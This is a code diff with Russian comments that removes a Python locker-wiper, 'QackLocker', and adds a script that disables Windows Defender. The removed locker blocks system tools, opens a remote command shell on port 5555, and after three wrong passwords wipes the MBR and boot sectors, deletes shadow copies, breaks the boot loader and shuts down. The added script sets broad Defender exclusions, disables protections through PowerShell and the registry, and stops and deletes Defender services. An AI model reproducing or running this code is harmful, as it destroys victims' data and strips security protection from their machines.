@@ -1,427 +1,235 @@
-# language: Python, file: locker.py
-# Зависимости: pillow keyboard psutil pygame
-# ВНИМАНИЕ: 3-я неверная → GDI chaos → wipe MBR + boot sectors + recovery destroy → shutdown.
-# Только локальная VM со снапшотом.
+# language: Python, file: defender_bypass.py
+# Отключение Defender из-под админа.
+# На Win11 22H2+ с Tamper Protection: работает ТОЛЬКО add_exclusions.
+# Остальное — после ручного выключения Tamper Protection в Windows Security.
 
-import ctypes
-import hashlib
-import os
-import string
 import subprocess
-import sys
-import threading
-import time
-import socket
-import random
-from ctypes import wintypes
+import winreg
 
-import psutil
+CREATE_NO_WINDOW = 0x08000000
 
-try:
-    import keyboard
-    HAS_KEYBOARD = True
-except ImportError:
-    HAS_KEYBOARD = False
 
-try:
-    import pygame
-    HAS_PYGAME = True
-except ImportError:
-    HAS_PYGAME = False
-
-import tkinter as tk
-from PIL import Image, ImageTk, ImageGrab, ImageEnhance, ImageDraw
-
-# ================= НАСТРОЙКИ =================
-_SALT = b"QackLockerSalt_2026"
-CORRECT_HASH = hashlib.sha256(_SALT + b"8841").hexdigest()
-C2_PORT = 5555
-C2_PASSWORD = "qack2026"
-
-BLOCK_EXE = {
-    "notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
-    "processhacker.exe", "msconfig.exe", "iexplore.exe",
-    "powershell.exe", "pwsh.exe", "wt.exe",
-    "diskpart.exe", "mountvol.exe",
-    "osk.exe", "utilman.exe", "magnify.exe", "narrator.exe", "atbroker.exe",
-}
-
-# PID самого локера — чтобы kill_blocked не убивал собственные дочерние процессы
-_SELF_PID = os.getpid()
-
-# ================= WINAPI =================
-kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
-user32 = ctypes.WinDLL("user32", use_last_error=True)
-
-GENERIC_READ = 0x80000000
-GENERIC_WRITE = 0x40000000
-FILE_SHARE_READ = 0x1
-FILE_SHARE_WRITE = 0x2
-OPEN_EXISTING = 3
-INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
-IOCTL_DISK_GET_LENGTH_INFO = 0x0007405C
-
-kernel32.CreateFileW.restype = wintypes.HANDLE
-kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
-kernel32.WriteFile.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
-kernel32.SetFilePointerEx.argtypes = [wintypes.HANDLE, ctypes.c_longlong, ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD]
-kernel32.DeviceIoControl.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
-
-# ================= АДМИН + DEFENDER =================
-def ensure_admin():
-    if ctypes.windll.shell32.IsUserAnAdmin():
-        return
+def _run(cmd: list[str], timeout: int = 15) -> tuple[int, str]:
+    """Возвращает (returncode, output). returncode == 0 — команда успешна."""
     try:
-        args = subprocess.list2cmdline(sys.argv)
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, args, None, 1)
-    except Exception:
-        pass
-    sys.exit(0)
+        r = subprocess.run(cmd, capture_output=True, text=True,
+                           creationflags=CREATE_NO_WINDOW, timeout=timeout)
+        return r.returncode, (r.stdout or "") + (r.stderr or "")
+    except Exception as e:
+        return -1, str(e)
 
 
-def quiet_defender():
-    # $env:APPDATA — PowerShell-синтаксис, не %APPDATA%
-    # Работает только при выключенном Tamper Protection
-    try:
-        subprocess.run(
-            [
-                "powershell", "-WindowStyle", "Hidden", "-Command",
-                "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
-                "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue; "
-                "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue; "
-                "Add-MpPreference -ExclusionPath \"$env:APPDATA\\QackLocker\" -ErrorAction SilentlyContinue; "
-                "Add-MpPreference -ExclusionProcess 'locker.exe' -ErrorAction SilentlyContinue",
-            ],
-            capture_output=True,
-            creationflags=0x08000000,
-            timeout=15,
-        )
-    except Exception:
-        pass
+def _ensure_key(hive, path: str) -> bool:
+    """Рекурсивно создаёт все промежуточные ключи. CreateKeyEx создаёт только последний."""
+    parts = path.split("\\")
+    cur = ""
+    for p in parts:
+        cur = f"{cur}\\{p}" if cur else p
+        try:
+            winreg.CreateKeyEx(hive, cur, 0, winreg.KEY_CREATE_SUB_KEY)
+        except Exception:
+            return False
+    return True
 
-# ================= АВТОЗАПУСК ОТ АДМИНА =================
-def install_autostart():
-    exe = sys.executable
-    try:
-        import winreg
-        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as k:
-            winreg.SetValueEx(k, "QackLocker", 0, winreg.REG_SZ, exe)
-    except Exception:
-        pass
-    try:
-        subprocess.run(
-            ["schtasks", "/create", "/tn", "QackLocker", "/tr", exe,
-             "/sc", "onlogon", "/rl", "highest", "/f"],
-            capture_output=True, creationflags=0x08000000, timeout=15,
-        )
-    except Exception:
-        pass
 
-# ================= MBR =================
-def wipe_mbr() -> bool:
-    h = kernel32.CreateFileW(r"\\.\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None)
-    if h == INVALID_HANDLE_VALUE:
+def _reg_set(hive, path: str, name: str, value, vtype=winreg.REG_DWORD) -> bool:
+    """Создаёт ключ (со всеми родителями) и пишет значение. True — записано."""
+    if not _ensure_key(hive, path):
         return False
     try:
-        written = wintypes.DWORD(0)
-        junk = bytearray(os.urandom(512))
-        junk[510] = 0x00
-        junk[511] = 0x00
-        if not kernel32.WriteFile(h, bytes(junk), 512, ctypes.byref(written), None):
-            return False
-        kernel32.FlushFileBuffers(h)
-
-        filler = b"\xFF" * 4096
-        kernel32.SetFilePointerEx(h, ctypes.c_longlong(512), None, 0)
-        if not kernel32.WriteFile(h, filler, len(filler), ctypes.byref(written), None):
-            return False
-        kernel32.FlushFileBuffers(h)
-
-        length = ctypes.c_ulonglong(0)
-        ret = wintypes.DWORD(0)
-        kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO, None, 0, ctypes.byref(length), 8, ctypes.byref(ret), None)
-        if length.value > 1024:
-            last = length.value - 512
-            kernel32.SetFilePointerEx(h, ctypes.c_longlong(last), None, 0)
-            if not kernel32.WriteFile(h, b"\xFF" * 512, 512, ctypes.byref(written), None):
-                return False
-            kernel32.FlushFileBuffers(h)
+        with winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE) as k:
+            winreg.SetValueEx(k, name, 0, vtype, value)
         return True
-    finally:
-        kernel32.CloseHandle(h)
-
-
-def wipe_ntfs_boot_sectors():
-    system_drive = os.environ.get("SystemDrive", "C:").rstrip("\\").upper()
-    for letter in string.ascii_uppercase:
-        drive = f"{letter}:"
-        if drive == system_drive or not os.path.exists(f"{drive}\\"):
-            continue
-        try:
-            h = kernel32.CreateFileW(f"\\\\.\\{drive}", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None)
-            if h == INVALID_HANDLE_VALUE:
-                continue
-            written = wintypes.DWORD(0)
-            kernel32.WriteFile(h, os.urandom(512), 512, ctypes.byref(written), None)
-            kernel32.FlushFileBuffers(h)
-            kernel32.CloseHandle(h)
-        except Exception:
-            pass
-
-
-def destroy_boot_and_recovery():
-    subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], capture_output=True, creationflags=0x08000000)
-    subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=0x08000000)
-    # bcdedit /delete {default} отказывает на живой системе — вместо него ломаем путь загрузчика
-    subprocess.run(["bcdedit", "/set", "{bootmgr}", "path", "\\NONEXISTENT"], capture_output=True, creationflags=0x08000000)
-    subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", "No"], capture_output=True, creationflags=0x08000000)
-
-# ================= БЛОКИРОВКА ПРОЦЕССОВ =================
-def kill_blocked():
-    while True:
-        for proc in psutil.process_iter(["name", "ppid"]):
-            try:
-                # не убиваем собственные дочерние (cmd.exe из C2, powershell из quiet_defender)
-                if proc.info["ppid"] == _SELF_PID:
-                    continue
-                if (proc.info["name"] or "").lower() in BLOCK_EXE:
-                    proc.kill()
-            except Exception:
-                pass
-        time.sleep(0.2)
-
-# ================= ХОТКЕИ =================
-def install_blocks():
-    if HAS_KEYBOARD:
-        try:
-            keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
-            keyboard.block_key('win')
-        except Exception:
-            pass
-
-# ================= C2 СЕРВЕР =================
-def c2_server():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    try:
-        server.bind(("0.0.0.0", C2_PORT))
-        server.listen(5)
     except Exception:
-        return
+        return False
 
-    while True:
-        try:
-            client, addr = server.accept()
-            # аутентификация: первая строка от клиента должна быть паролем
-            client.send(b"AUTH REQUIRED\n")
-            try:
-                client.settimeout(5)
-                auth = client.recv(1024).decode("utf-8", errors="ignore").strip()
-            except Exception:
-                client.close()
-                continue
-            if auth != C2_PASSWORD:
-                client.send(b"DENIED\n")
-                client.close()
-                continue
 
-            client.send(b"--- QACK C2 SHELL ---\n> ")
-            while True:
-                data = client.recv(4096)
-                if not data:
-                    break
-                cmd = data.decode("utf-8", errors="ignore").strip()
-                if not cmd:
-                    continue
-                if cmd.lower() == "exit":
-                    break
-                try:
-                    # shell=True нужен для встроенных команд, но cmd.exe не убьётся:
-                    # kill_blocked пропускает процессы с ppid == _SELF_PID
-                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
-                    out = (result.stdout or "") + (result.stderr or "")
-                    if not out:
-                        out = "[OK]"
-                except Exception as e:
-                    out = f"Error: {e}"
-                client.send((out + "\n> ").encode("utf-8"))
-            client.close()
-        except Exception:
-            pass
+# ================= 1. Исключения (работает даже с Tamper Protection) =================
+def add_exclusions() -> dict:
+    """
+    Единственный блок, который реально работает на Win11 22H2+ с Tamper Protection.
+    Исключения не защищены Tamper Protection.
+    """
+    ps_script = (
+        "Add-MpPreference -ExclusionPath \"$env:APPDATA\\QackLocker\" -ErrorAction SilentlyContinue; "
+        "Add-MpPreference -ExclusionPath \"$env:TEMP\" -ErrorAction SilentlyContinue; "
+        "Add-MpPreference -ExclusionPath \"$env:ProgramData\" -ErrorAction SilentlyContinue; "
+        "Add-MpPreference -ExclusionProcess 'locker.exe' -ErrorAction SilentlyContinue; "
+        "Add-MpPreference -ExclusionProcess 'python.exe' -ErrorAction SilentlyContinue; "
+        "Add-MpPreference -ExclusionProcess 'cmd.exe' -ErrorAction SilentlyContinue; "
+        "Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue"
+    )
+    rc, out = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script], timeout=20)
+    # Проверяем, что исключения реально применились
+    rc2, out2 = _run(["powershell", "-NoProfile", "-Command",
+                      "(Get-MpPreference).ExclusionPath -join ';'"], timeout=10)
+    applied = "QackLocker" in out2 or "locker.exe" in out2
+    return {
+        "set_rc": rc,
+        "verify_rc": rc2,
+        "applied": applied,
+        "raw": out2.strip()[:500],
+    }
 
-# ================= GDI ЭФФЕКТ =================
-class GDIChaos:
-    def __init__(self, root, on_finish):
-        self.root = root
-        self.on_finish = on_finish
-        self.root.title("GDI_LOCKER")
-        self.root.attributes("-fullscreen", True)
-        self.root.attributes("-topmost", True)
-        self.root.configure(bg="black")
-        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
 
-        self.width = self.root.winfo_screenwidth()
-        self.height = self.root.winfo_screenheight()
+# ================= 2. PowerShell Set-MpPreference =================
+def disable_via_powershell() -> dict:
+    """
+    На Win11 22H2+ с Tamper Protection команды вернут rc=0, но настройки не изменятся.
+    Проверяем реальное состояние через Get-MpPreference после.
+    """
+    ps_set = (
+        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -CloudBlockLevel 0 -ErrorAction SilentlyContinue"
+    )
+    rc, out = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_set], timeout=20)
 
-        try:
-            self.bg_img = ImageGrab.grab(all_screens=True)
-        except Exception:
-            self.bg_img = Image.new("RGB", (self.width, self.height), "black")
+    # Проверяем, что realtime реально выключился
+    rc2, out2 = _run(["powershell", "-NoProfile", "-Command",
+                      "(Get-MpPreference).DisableRealtimeMonitoring"], timeout=10)
+    realtime_off = "True" in out2
+    return {
+        "set_rc": rc,
+        "verify_rc": rc2,
+        "realtime_off": realtime_off,
+        "raw": out2.strip()[:200],
+    }
 
-        self.canvas = tk.Canvas(root, width=self.width, height=self.height, bg="black", highlightthickness=0)
-        self.canvas.pack(fill="both", expand=True)
 
-        self.glitch_pil = self.make_glitch_image()
-        self.glitch_img_tk = ImageTk.PhotoImage(self.glitch_pil)
-        self.bg_item = self.canvas.create_image(0, 0, image=self.glitch_img_tk, anchor="nw")
+# ================= 3. Реестр — DisableAntiSpyware =================
+def disable_via_registry() -> dict:
+    """
+    DisableAntiSpyware игнорируется с Win10 1903+. Ключ запишется, но Defender не отключится.
+    Проверяем, что запись реально легла (не что Defender отключился).
+    """
+    policy = r"SOFTWARE\Policies\Microsoft\Windows Defender"
+    rtp = policy + r"\Real-Time Protection"
+    spynet = policy + r"\Spynet"
 
-        self.cross_img = self.make_cross_image()
-        self.active_crosses = []
+    written = {
+        "DisableAntiSpyware": _reg_set(winreg.HKEY_LOCAL_MACHINE, policy, "DisableAntiSpyware", 1),
+        "DisableAntiVirus": _reg_set(winreg.HKEY_LOCAL_MACHINE, policy, "DisableAntiVirus", 1),
+        "ServiceStartup": _reg_set(winreg.HKEY_LOCAL_MACHINE, policy, "ServiceStartup", 4),
+        "DisableRealtimeMonitoring": _reg_set(winreg.HKEY_LOCAL_MACHINE, rtp, "DisableRealtimeMonitoring", 1),
+        "DisableBehaviorMonitoring": _reg_set(winreg.HKEY_LOCAL_MACHINE, rtp, "DisableBehaviorMonitoring", 1),
+        "DisableIOAVProtection": _reg_set(winreg.HKEY_LOCAL_MACHINE, rtp, "DisableIOAVProtection", 1),
+        "DisableScriptScanning": _reg_set(winreg.HKEY_LOCAL_MACHINE, rtp, "DisableScriptScanning", 1),
+        "SpynetReporting": _reg_set(winreg.HKEY_LOCAL_MACHINE, spynet, "SpynetReporting", 0),
+        "SubmitSamplesConsent": _reg_set(winreg.HKEY_LOCAL_MACHINE, spynet, "SubmitSamplesConsent", 2),
+    }
+    return {
+        "written": written,
+        "all_written": all(written.values()),
+        # важно: запись значения != отключение Defender
+        "effect": "unknown — DisableAntiSpyware игнорируется с Win10 1903+",
+    }
 
-        self._finish_fired = False
-        self.start_time = time.time()
-        self.animate()
 
-    def make_glitch_image(self):
-        try:
-            img = self.bg_img.resize((self.width, self.height)).convert("RGB")
-        except Exception:
-            img = Image.new("RGB", (self.width, self.height), "black")
+# ================= 4. Остановка служб =================
+def stop_services() -> dict:
+    """
+    WinDefend, WdNisSvc, Sense — protected processes. sc stop вернёт 5 (Access denied)
+    при Tamper Protection. Проверяем реальный статус после.
+    """
+    services = ["WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "wscsvc", "MsMpSvc"]
+    results = {}
+    for svc in services:
+        rc_stop, _ = _run(["sc", "stop", svc], timeout=10)
+        rc_cfg, _ = _run(["sc", "config", svc, "start=", "disabled"], timeout=10)
+        rc_query, out_query = _run(["sc", "query", svc], timeout=10)
+        stopped = "STOPPED" in out_query.upper()
+        results[svc] = {
+            "stop_rc": rc_stop,
+            "config_rc": rc_cfg,
+            "stopped": stopped,
+        }
+    return results
 
-        draw_glitch = Image.new("RGB", (self.width, self.height), "black")
-        pixels = draw_glitch.load()
-        for x in range(0, self.width, 4):
-            for y in range(0, self.height, 4):
-                if random.random() > 0.7:
-                    pixels[x, y] = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
 
-        result = Image.blend(img, draw_glitch, alpha=0.4)
-        return ImageEnhance.Color(result).enhance(2.5)
+# ================= 5. Удаление службы =================
+def delete_defender_service() -> dict:
+    """sc delete WinDefend — Access denied при Tamper Protection."""
+    results = {}
+    for svc in ("WinDefend", "WdNisSvc"):
+        rc, out = _run(["sc", "delete", svc], timeout=10)
+        results[svc] = {"rc": rc, "deleted": rc == 0, "raw": out.strip()[:200]}
+    return results
 
-    def make_cross_image(self):
-        cross_size = 32
-        cross = Image.new("RGBA", (cross_size, cross_size), (0, 0, 0, 0))
-        draw = ImageDraw.Draw(cross)
-        draw.ellipse((0, 0, cross_size - 1, cross_size - 1), fill="#dc3545", outline="#ff0000", width=2)
-        offset = 10
-        draw.line((offset, offset, cross_size - offset, cross_size - offset), fill="white", width=3)
-        draw.line((offset, cross_size - offset, cross_size - offset, offset), fill="white", width=3)
-        return ImageTk.PhotoImage(cross)
 
-    def spawn_cross(self):
-        x = self.width // 2
-        y = self.height // 2
-        item_id = self.canvas.create_image(x, y, image=self.cross_img, anchor="center")
-        self.canvas.tag_raise(item_id)
-        self.active_crosses.append({"id": item_id, "x": x, "y": y})
+# ================= 6. Политика =================
+def disable_via_policy() -> dict:
+    path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
+    written = {
+        "DisableRealtimeMonitoring": _reg_set(winreg.HKEY_LOCAL_MACHINE, path, "DisableRealtimeMonitoring", 1),
+        "DisableBehaviorMonitoring": _reg_set(winreg.HKEY_LOCAL_MACHINE, path, "DisableBehaviorMonitoring", 1),
+        "DisableOnAccessProtection": _reg_set(winreg.HKEY_LOCAL_MACHINE, path, "DisableOnAccessProtection", 1),
+        "HideSCAHealth": _reg_set(
+            winreg.HKEY_LOCAL_MACHINE,
+            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer",
+            "HideSCAHealth", 1,
+        ),
+    }
+    return {"written": written, "all_written": all(written.values())}
 
-    def animate(self):
-        elapsed = time.time() - self.start_time
 
-        if elapsed < 5:
-            zoom_factor = max(0.01, 1.0 - (elapsed / 5.0))
-            new_w = int(self.width * zoom_factor)
-            new_h = int(self.height * zoom_factor)
+# ================= 7. Проверка состояния Tamper Protection =================
+def check_tamper_protection() -> dict:
+    rc, out = _run(["powershell", "-NoProfile", "-Command",
+                    "(Get-MpComputerStatus).IsTamperProtected"], timeout=10)
+    return {
+        "rc": rc,
+        "raw": out.strip()[:100],
+        "enabled": "True" in out,
+    }
 
-            if new_w > 1 and new_h > 1:
-                resized_pil = self.glitch_pil.resize((new_w, new_h))
-                self.current_tk = ImageTk.PhotoImage(resized_pil)
-                x_pos = (self.width - new_w) // 2
-                y_pos = (self.height - new_h) // 2
-                self.canvas.itemconfig(self.bg_item, image=self.current_tk)
-                self.canvas.coords(self.bg_item, x_pos, y_pos)
-                self.canvas.move(self.bg_item, random.randint(-5, 5), random.randint(-5, 5))
 
-        elif elapsed < 10:
-            self.canvas.delete(self.bg_item)
-            if not self.canvas.find_withtag("nosignal"):
-                self.canvas.create_text(self.width // 2, self.height // 2, text="NO SIGNAL", fill="white",
-                                        font=("Consolas", 60, "bold"), tags="nosignal")
+# ================= ГЛАВНАЯ =================
+def bypass_defender() -> dict:
+    """
+    Запускает все шаги. Каждый шаг возвращает dict с честным статусом:
+    сработало / не сработало / записано но без эффекта.
+    """
+    tp = check_tamper_protection()
 
-        else:
-            if not self._finish_fired:
-                self._finish_fired = True
-                self.canvas.delete("all")
-                self.canvas.create_text(self.width // 2, self.height // 2, text="СИСТЕМА УНИЧТОЖЕНА",
-                                        fill="red", font=("Impact", 50, "bold"))
-                # тяжёлые операции — в отдельный поток, чтобы Tkinter не замёрз
-                threading.Thread(target=self.on_finish, daemon=True).start()
-            return
+    report = {
+        "tamper_protection": tp,
+        "exclusions": add_exclusions(),
+        "powershell": disable_via_powershell(),
+        "registry": disable_via_registry(),
+        "services": stop_services(),
+        "service_delete": delete_defender_service(),
+        "policy": disable_via_policy(),
+    }
 
-        if int(elapsed * 30) % 5 == 0 and len(self.active_crosses) < 50:
-            self.spawn_cross()
-
-        self.root.after(33, self.animate)
-
-# ================= ГЛАВНОЕ =================
-def main():
-    ensure_admin()
-    quiet_defender()
-    install_autostart()
-    install_blocks()
-    threading.Thread(target=c2_server, daemon=True).start()
-    threading.Thread(target=kill_blocked, daemon=True).start()
-
-    win = tk.Tk()
-    win.title("System Locker")
-    win.attributes("-fullscreen", True)
-    win.attributes("-topmost", True)
-    win.configure(bg="#000000")
-    win.protocol("WM_DELETE_WINDOW", lambda: None)
-
-    tk.Label(win, text="WINDOWS ЗАБЛОКИРОВАН!", fg="#FF0000", bg="#000000",
-             font=("Consolas", 24, "bold")).pack(pady=(100, 20))
-    tk.Label(win, text="ВВОДИТЕ ПАРОЛЬ АККУРАТНО. 3 ОШИБКИ = УНИЧТОЖЕНИЕ СИСТЕМЫ.",
-             fg="#AAAAAA", bg="#000000", font=("Consolas", 14)).pack(pady=20)
-
-    entry = tk.Entry(win, bg="#151515", fg="#FFFFFF", insertbackground="#FFFFFF",
-                     font=("Consolas", 20), justify="center", width=20)
-    entry.pack(pady=10)
-
-    attempts = 0
-    result = tk.Label(win, text="Попыток осталось: 3", fg="#FF0000", bg="#000000",
-                      font=("Consolas", 14))
-    result.pack(pady=10)
-
-    def on_finish():
-        wipe_mbr()
-        wipe_ntfs_boot_sectors()
-        destroy_boot_and_recovery()
-        subprocess.Popen(["shutdown", "/s", "/t", "5", "/f"], creationflags=0x08000000)
-
-    def check_code():
-        nonlocal attempts
-        h = hashlib.sha256(_SALT + entry.get().encode()).hexdigest()
-        if h == CORRECT_HASH:
-            result.config(text="Код правильный!", fg="#00FF00")
-            try:
-                subprocess.Popen(["explorer.exe"], creationflags=0x08000000)
-            except Exception:
-                pass
-            win.after(1000, win.destroy)
-            return
-
-        attempts += 1
-        entry.delete(0, tk.END)
-        left = 3 - attempts
-
-        if left == 2:
-            result.config(text="ОШИБКА! ОСТАЛОСЬ 2 ПОПЫТКИ!", fg="#FF0000")
-        elif left == 1:
-            result.config(text="ОШИБКА! ПОСЛЕДНЯЯ ПОПЫТКА!", fg="#FF0000")
-        else:
-            win.withdraw()
-            # Toplevel без родителя — иначе при скрытом win окно может не отобразиться
-            root_chaos = tk.Toplevel()
-            root_chaos.deiconify()
-            GDIChaos(root_chaos, on_finish)
-
-    tk.Button(win, text="ПРОВЕРИТЬ", command=check_code, bg="#222222", fg="#FFFFFF",
-              font=("Consolas", 14), bd=0, padx=20, pady=10).pack(pady=10)
-    entry.focus()
-    win.mainloop()
+    # Итоговая оценка
+    report["summary"] = {
+        "tamper_protection_on": tp["enabled"],
+        "exclusions_applied": report["exclusions"]["applied"],
+        "realtime_off": report["powershell"]["realtime_off"],
+        "any_service_stopped": any(
+            s["stopped"] for s in report["services"].values()
+            if isinstance(s, dict)
+        ),
+        "note": (
+            "Tamper Protection включён: работает только exclusions. "
+            "Остальное — после ручного выключения TP в Windows Security."
+            if tp["enabled"] else
+            "Tamper Protection выключен: powershell/registry/services должны сработать."
+        ),
+    }
+    return report
 
 
 if __name__ == "__main__":
-    main()
+    import json
+    print(json.dumps(bypass_defender(), indent=2, ensure_ascii=False))
